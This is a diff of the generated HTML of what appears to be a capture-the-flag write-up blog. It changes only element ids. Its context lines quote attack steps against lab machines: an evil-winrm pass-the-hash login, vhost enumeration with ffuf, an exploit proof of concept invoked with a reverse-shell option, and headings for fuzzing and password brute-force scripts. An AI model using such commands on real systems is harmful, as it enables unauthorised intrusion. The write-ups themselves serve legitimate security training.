       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2357,8 +2423,8 @@ evil-winrm -i 10.129.30.97 -u Administrator -H &amp;#39;32693b11e6aa90eb43d32c72
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;485763129&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;485763129&#34;&gt;
+    &lt;input id=&#34;873514296&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;873514296&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Vhost enumeration using ffuf&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2408,8 +2474,8 @@ lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Dura
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;518963742&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;518963742&#34;&gt;
+    &lt;input id=&#34;379251684&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;379251684&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Running exploit POC&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2477,8 +2543,8 @@ python3 main.py -u http://lms.permx.htb -a revshell
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;632975418&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;632975418&#34;&gt;
+    &lt;input id=&#34;467319285&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;467319285&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;/opt/acl.sh&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2850,8 +2916,8 @@ These points are covered here -&amp;gt; &lt;a href=&#34;https://portswigger.net/
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;476812953&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;476812953&#34;&gt;
+    &lt;input id=&#34;478293651&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;478293651&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Fuzzing for other endpoints&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
@@ -2951,8 +3017,8 @@ wlist.close()
 
 
   &lt;div class=&#34;collapsable-code&#34;&gt;
-    &lt;input id=&#34;685231794&#34; type=&#34;checkbox&#34;  /&gt;
-    &lt;label for=&#34;685231794&#34;&gt;
+    &lt;input id=&#34;453689127&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;453689127&#34;&gt;
       &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__title&#34;&gt;Password Brute-Force&lt;/span&gt;
       &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
